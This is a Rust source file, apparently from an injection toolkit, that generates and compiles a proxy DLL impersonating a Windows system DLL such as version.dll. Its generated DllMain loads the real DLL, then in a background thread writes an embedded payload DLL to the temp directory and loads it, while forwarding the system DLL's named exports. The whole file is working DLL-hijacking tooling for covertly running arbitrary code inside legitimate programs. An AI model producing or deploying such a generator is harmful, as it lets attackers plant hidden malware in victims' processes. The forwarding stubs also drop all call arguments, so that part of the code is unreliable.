//! Proxy DLL generator.
//!
//! Generates Rust source code for a proxy DLL that forwards exports to the real
//! system DLL while loading a payload DLL in the background.

use crate::pe::{parse_exports, PeFile};
use crate::InjectionError;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

/// Generates proxy DLLs that forward exports and load payloads.
pub struct ProxyDllGenerator {
    /// Path to the system DLL to proxy
    system_dll_path: PathBuf,
    /// Path to the payload DLL to embed
    payload_dll_path: PathBuf,
    /// Working directory for generation
    work_dir: PathBuf,
}

impl ProxyDllGenerator {
    /// Create a new proxy DLL generator.
    ///
    /// # Arguments
    /// * `system_dll_name` - Name of system DLL (e.g., "version.dll")
    /// * `payload_dll_path` - Path to payload DLL to embed
    ///
    /// # Returns
    /// * `Ok(ProxyDllGenerator)` - Generator created
    /// * `Err(InjectionError)` - System DLL not found
    pub fn new(system_dll_name: &str, payload_dll_path: &Path) -> Result<Self, InjectionError> {
        let system_dll_path = Self::find_system_dll(system_dll_name)?;

        // Create work directory in temp
        let work_dir = std::env::temp_dir().join(format!("proxy_gen_{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs()
        ));

        log::info!("Creating proxy generator for {} in {}", system_dll_name, work_dir.display());

        Ok(Self {
            system_dll_path,
            payload_dll_path: payload_dll_path.to_path_buf(),
            work_dir,
        })
    }

    /// Find a system DLL in the System32 directory.
    fn find_system_dll(dll_name: &str) -> Result<PathBuf, InjectionError> {
        let system_root = std::env::var("SystemRoot")
            .unwrap_or_else(|_| "C:\\Windows".to_string());

        let dll_path = PathBuf::from(&system_root).join("System32").join(dll_name);

        if !dll_path.exists() {
            return Err(InjectionError::DllNotFound(format!(
                "System DLL not found: {}",
                dll_path.display()
            )));
        }

        log::debug!("Found system DLL: {}", dll_path.display());
        Ok(dll_path)
    }

    /// Generate the proxy DLL and return path to compiled output.
    ///
    /// # Returns
    /// * `Ok(PathBuf)` - Path to compiled proxy DLL
    /// * `Err(InjectionError)` - Generation or compilation failed
    pub fn generate(&self) -> Result<PathBuf, InjectionError> {
        log::info!("Generating proxy DLL");

        // Create work directory
        fs::create_dir_all(&self.work_dir)
            .map_err(|e| InjectionError::Io(e))?;

        // Parse system DLL exports
        let pe = PeFile::from_file(&self.system_dll_path)?;
        let exports = parse_exports(&pe)?;

        log::info!("Parsed {} exports from {}", exports.exports.len(), exports.dll_name);

        // Create Cargo project structure
        let src_dir = self.work_dir.join("src");
        fs::create_dir_all(&src_dir)
            .map_err(|e| InjectionError::Io(e))?;

        // Generate Cargo.toml
        self.generate_cargo_toml(&exports.dll_name)?;

        // Generate lib.rs
        self.generate_lib_rs(&exports)?;

        // Embed payload
        self.embed_payload()?;

        // Compile proxy
        self.compile_proxy()
    }

    /// Generate Cargo.toml for the proxy project.
    fn generate_cargo_toml(&self, dll_name: &str) -> Result<(), InjectionError> {
        let lib_name = dll_name.trim_end_matches(".dll");

        let cargo_toml = format!(
            r#"[package]
name = "proxy_{}"
version = "0.1.0"
edition = "2021"

[lib]
name = "{}"
crate-type = ["cdylib"]

[dependencies]
windows = {{ version = "0.58", features = [
    "Win32_Foundation",
    "Win32_System_LibraryLoader",
    "Win32_System_Threading",
] }}

[profile.release]
opt-level = 3
lto = true
strip = true
codegen-units = 1
panic = "abort"
"#,
            lib_name, lib_name
        );

        let cargo_path = self.work_dir.join("Cargo.toml");
        fs::write(&cargo_path, cargo_toml)
            .map_err(|e| InjectionError::PayloadEmbeddingFailed(format!(
                "Failed to write Cargo.toml: {}", e
            )))?;

        log::debug!("Generated Cargo.toml at {}", cargo_path.display());
        Ok(())
    }

    /// Generate lib.rs with DllMain and export forwarding functions.
    fn generate_lib_rs(&self, exports: &crate::pe::ExportTable) -> Result<(), InjectionError> {
        let system_dll_name = self.system_dll_path
            .file_name()
            .and_then(|n| n.to_str())
            .ok_or_else(|| InjectionError::InvalidPeFile("Invalid system DLL path".to_string()))?;

        let mut code = String::new();

        // Header and imports
        code.push_str(r#"//! Auto-generated proxy DLL
//! This DLL forwards exports to the real system DLL and loads a payload.

use std::sync::OnceLock;
use windows::core::{PCSTR, s};
use windows::Win32::Foundation::{BOOL, HINSTANCE};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
use windows::Win32::System::Threading::CreateThread;

/// Handle to the original system DLL
static ORIGINAL_DLL: OnceLock<HINSTANCE> = OnceLock::new();

/// DLL entry point
#[no_mangle]
#[allow(non_snake_case)]
extern "system" fn DllMain(hinst_dll: HINSTANCE, fdw_reason: u32, _lpv_reserved: *mut ()) -> BOOL {
    const DLL_PROCESS_ATTACH: u32 = 1;

    if fdw_reason == DLL_PROCESS_ATTACH {
        // Load the real system DLL from System32
"#);

        code.push_str(&format!(r#"        let system_dll_path = format!("{{}}\\System32\\{}",
            std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string()));

        let wide_path: Vec<u16> = system_dll_path.encode_utf16().chain(std::iter::once(0)).collect();

        unsafe {{
            if let Ok(dll) = LoadLibraryW(windows::core::PCWSTR::from_raw(wide_path.as_ptr())) {{
                ORIGINAL_DLL.set(dll).ok();

                // Spawn thread to load payload
                CreateThread(
                    None,
                    0,
                    Some(payload_thread),
                    None,
                    windows::Win32::System::Threading::THREAD_CREATE_RUN_IMMEDIATELY,
                    None
                ).ok();
            }}
        }}
    }}

    BOOL::from(true)
}}

/// Thread that loads the embedded payload DLL
unsafe extern "system" fn payload_thread(_: *mut std::ffi::c_void) -> u32 {{
    // Extract embedded payload to temp directory
    let payload_bytes = include_bytes!("payload.dll");

    let temp_path = std::env::temp_dir().join("payload_temp.dll");

    if std::fs::write(&temp_path, payload_bytes).is_ok() {{
        let wide_path: Vec<u16> = temp_path.to_string_lossy()
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        LoadLibraryW(windows::core::PCWSTR::from_raw(wide_path.as_ptr())).ok();
    }}

    0
}}

"#, system_dll_name));

        // Generate export forwarding functions
        for export in &exports.exports {
            // Skip forwarded and unnamed exports
            if export.is_forwarded || export.name.is_empty() {
                continue;
            }

            code.push_str(&format!(
                r#"/// Forward to {name}
#[no_mangle]
#[allow(non_snake_case)]
pub unsafe extern "system" fn {name}() {{
    if let Some(dll) = ORIGINAL_DLL.get() {{
        if let Some(proc) = GetProcAddress(*dll, s!("{name}")) {{
            let func: extern "system" fn() = std::mem::transmute(proc);
            func();
        }}
    }}
}}

"#,
                name = export.name
            ));
        }

        let lib_path = self.work_dir.join("src").join("lib.rs");
        fs::write(&lib_path, code)
            .map_err(|e| InjectionError::PayloadEmbeddingFailed(format!(
                "Failed to write lib.rs: {}", e
            )))?;

        log::debug!("Generated lib.rs with {} exports at {}", exports.exports.len(), lib_path.display());
        Ok(())
    }

    /// Copy payload DLL to proxy project for embedding.
    fn embed_payload(&self) -> Result<(), InjectionError> {
        let src_dir = self.work_dir.join("src");
        let payload_dest = src_dir.join("payload.dll");

        fs::copy(&self.payload_dll_path, &payload_dest)
            .map_err(|e| InjectionError::PayloadEmbeddingFailed(format!(
                "Failed to copy payload DLL: {}", e
            )))?;

        log::debug!("Embedded payload at {}", payload_dest.display());
        Ok(())
    }

    /// Compile the proxy DLL using cargo.
    fn compile_proxy(&self) -> Result<PathBuf, InjectionError> {
        log::info!("Compiling proxy DLL with cargo build --release");

        // Check if cargo is available
        let cargo_check = Command::new("cargo")
            .arg("--version")
            .output();

        if cargo_check.is_err() {
            return Err(InjectionError::ProxyCompilationFailed(
                "cargo not found in PATH. Please install Rust toolchain.".to_string()
            ));
        }

        // Run cargo build
        let output = Command::new("cargo")
            .arg("build")
            .arg("--release")
            .current_dir(&self.work_dir)
            .output()
            .map_err(|e| InjectionError::ProxyCompilationFailed(format!(
                "Failed to execute cargo: {}", e
            )))?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(InjectionError::ProxyCompilationFailed(format!(
                "Cargo build failed:\n{}", stderr
            )));
        }

        // Find compiled DLL
        let target_dir = self.work_dir.join("target").join("release");

        // Find .dll file in target directory
        let dll_files: Vec<_> = fs::read_dir(&target_dir)
            .map_err(|e| InjectionError::ProxyCompilationFailed(format!(
                "Failed to read target directory: {}", e
            )))?
            .filter_map(|e| e.ok())
            .filter(|e| e.path().extension().and_then(|s| s.to_str()) == Some("dll"))
            .collect();

        if dll_files.is_empty() {
            return Err(InjectionError::ProxyCompilationFailed(
                "No DLL found in target/release directory".to_string()
            ));
        }

        let dll_path = dll_files[0].path();
        log::info!("Proxy DLL compiled successfully: {}", dll_path.display());

        Ok(dll_path)
    }

    /// Get the work directory path.
    pub fn work_dir(&self) -> &Path {
        &self.work_dir
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_find_system_dll_version() {
        let result = ProxyDllGenerator::find_system_dll("version.dll");
        assert!(result.is_ok());

        let path = result.unwrap();
        assert!(path.exists());
        assert!(path.to_string_lossy().contains("version.dll"));
    }

    #[test]
    fn test_find_system_dll_kernel32() {
        let result = ProxyDllGenerator::find_system_dll("kernel32.dll");
        assert!(result.is_ok());
    }

    #[test]
    fn test_find_system_dll_not_found() {
        let result = ProxyDllGenerator::find_system_dll("nonexistent_dll_12345.dll");
        assert!(result.is_err());

        match result {
            Err(InjectionError::DllNotFound(_)) => {}
            _ => panic!("Expected DllNotFound error"),
        }
    }
}
